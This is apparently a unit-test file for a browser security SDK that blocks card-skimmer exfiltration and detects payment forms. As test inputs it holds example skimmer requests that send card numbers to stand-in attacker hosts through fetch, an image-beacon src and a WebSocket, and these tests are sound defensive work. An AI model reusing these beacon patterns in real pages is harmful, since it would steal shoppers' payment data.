// Unit tests for the browser SDK — shape logic, positive-security decisions, and the real hooks that
// block skimmer exfil across every channel (fetch, image beacon, WebSocket) + payment-form detection.
// Run: node browser/test.cjs
const assert = require("assert");
const NS = require("./nemesis-shield.js");

let pass = 0;
const ok = (name) => {
  pass++;
  console.log("  ok  " + name);
};
const enforceWith = (shield, allowKind, allowOrigin) => {
  shield._applyPolicy({
    mode: "enforce",
    policy: { shapes: { [NS.shapeOf(allowKind, allowOrigin).shape]: "allow" } },
  });
};

// 1. Shape stable per (kind, origin), origin-sensitive.
{
  const a = NS.shapeOf("connect", "https://api.example.com");
  assert.strictEqual(a.shape, NS.shapeOf("connect", "https://api.example.com").shape);
  assert.notStrictEqual(a.shape, NS.shapeOf("connect", "https://evil.example.com").shape);
  ok("shape stable + origin-sensitive");
}

// 2. decide: approve / off-baseline / fail-open.
{
  const s = NS.createShield({ token: "x", env: {}, fetch: () => Promise.resolve({ ok: false }) });
  assert.strictEqual(s.shouldBlock("connect", "https://anything.com"), false); // no baseline
  enforceWith(s, "connect", "https://api.example.com");
  assert.strictEqual(s.decide(NS.shapeOf("connect", "https://api.example.com").shape), null);
  assert.ok(s.decide(NS.shapeOf("connect", "https://evil.com").shape));
  ok("decide: approve / off-baseline / fail-open");
}

// 3. shouldBlock enforces off-baseline across kinds, never first-party.
{
  const s = NS.createShield({ token: "x", selfOrigin: "https://shop.example.com", env: {}, fetch: () => Promise.resolve({ ok: false }) });
  enforceWith(s, "connect", "https://api.stripe.com");
  assert.strictEqual(s.shouldBlock("connect", "https://api.stripe.com"), false); // approved PSP
  assert.strictEqual(s.shouldBlock("connect", "https://shop.example.com"), false); // first-party
  assert.strictEqual(s.shouldBlock("connect", "https://evil-exfil.ru"), true); // exfil
  assert.strictEqual(s.shouldBlock("script", "https://evil-cdn.ru"), true); // Magecart
  assert.strictEqual(s.shouldBlock("payform", "https://phish.ru"), true); // payment form-jack
  assert.strictEqual(s.shouldBlock("inline", "fp-deadbeef"), true); // inline tamper
  assert.strictEqual(s.shouldBlock("frame", "https://clickjack.ru"), true); // clickjacking
  ok("shouldBlock: exfil/Magecart/formjack/inline/frame flagged; legit + first-party allowed");
}

// 4. Live fetch wrapper blocks exfil, passes approved.
(async () => {
  const calls = [];
  const env = {
    location: { origin: "https://shop.example.com" },
    fetch: (u) => {
      calls.push(String(u));
      return Promise.resolve({ ok: true, json: () => Promise.resolve({}) });
    },
  };
  const s = NS.createShield({ token: "x", env, fetch: env.fetch });
  enforceWith(s, "connect", "https://api.stripe.com");
  s.install();
  await env.fetch("https://api.stripe.com/charge");
  assert.ok(calls.includes("https://api.stripe.com/charge"));
  let blocked = false;
  try {
    await env.fetch("https://evil-exfil.ru/collect?cc=4111");
  } catch (e) {
    blocked = e.message === "blocked_by_nemesis_shield";
  }
  assert.ok(blocked && !calls.includes("https://evil-exfil.ru/collect?cc=4111"));
  ok("live fetch wrapper: exfil blocked, legit passes");

  // 5. Image-beacon exfil (new Image().src) is blocked — the classic skimmer gate.
  {
    let realSet = null;
    function HTMLImageElement() {}
    Object.defineProperty(HTMLImageElement.prototype, "src", {
      configurable: true,
      enumerable: true,
      get() {
        return this._s;
      },
      set(v) {
        this._s = v;
        realSet = v;
      },
    });
    const ienv = { location: { origin: "https://shop.example.com" }, HTMLImageElement, fetch: env.fetch };
    const is = NS.createShield({ token: "x", env: ienv, fetch: env.fetch });
    enforceWith(is, "connect", "https://cdn.approved.com");
    is.install(); // wraps the HTMLImageElement.src setter
    const img = Object.create(HTMLImageElement.prototype);
    img.src = "https://evil-skimmer.ru/g.gif?cc=4111111111111111";
    assert.strictEqual(realSet, null, "exfil image request must be suppressed");
    img.src = "https://cdn.approved.com/logo.png";
    assert.strictEqual(realSet, "https://cdn.approved.com/logo.png", "approved image loads");
    ok("image-beacon exfil blocked, approved image allowed");
  }

  // 6. WebSocket exfil channel is blocked.
  {
    function WS(url) {
      this.url = url;
    }
    const wenv = { location: { origin: "https://shop.example.com" }, WebSocket: WS, fetch: env.fetch };
    const ws = NS.createShield({ token: "x", env: wenv, fetch: env.fetch });
    enforceWith(ws, "connect", "wss://rt.approved.com");
    ws.install();
    let wsBlocked = false;
    try {
      new wenv.WebSocket("wss://evil-exfil.ru/s");
    } catch (e) {
      wsBlocked = e.message === "blocked_by_nemesis_shield";
    }
    assert.ok(wsBlocked, "off-baseline WebSocket must be blocked");
    assert.doesNotThrow(() => new wenv.WebSocket("wss://rt.approved.com/s"));
    ok("WebSocket exfil blocked, approved WS allowed");
  }

  // 7. Payment-form detection (drives elevated form-jacking enforcement + field-injection alerts).
  {
    const s2 = NS.createShield({ token: "x", env: {}, fetch: env.fetch });
    const field = (attrs) => ({
      getAttribute: (k) => attrs[k] || null,
      type: attrs.type || "text",
      name: attrs.name || "",
      id: attrs.id || "",
    });
    const payForm = { getElementsByTagName: () => [field({ autocomplete: "cc-number", name: "cardnumber" })] };
    const plainForm = { getElementsByTagName: () => [field({ name: "email" })] };
    assert.strictEqual(s2.isPaymentForm(payForm), true);
    assert.strictEqual(s2.isPaymentForm(plainForm), false);
    assert.strictEqual(s2.isPaymentField(field({ name: "cvv" })), true);
    assert.strictEqual(s2.isPaymentField(field({ type: "password" })), true);
    assert.strictEqual(s2.isPaymentField(field({ name: "first_name" })), false);
    ok("payment-form + payment-field detection");
  }

  console.log("\n" + pass + "/7 browser SDK tests passed");
})().catch((e) => {
  console.error("FAIL:", e.message);
  process.exit(1);
});
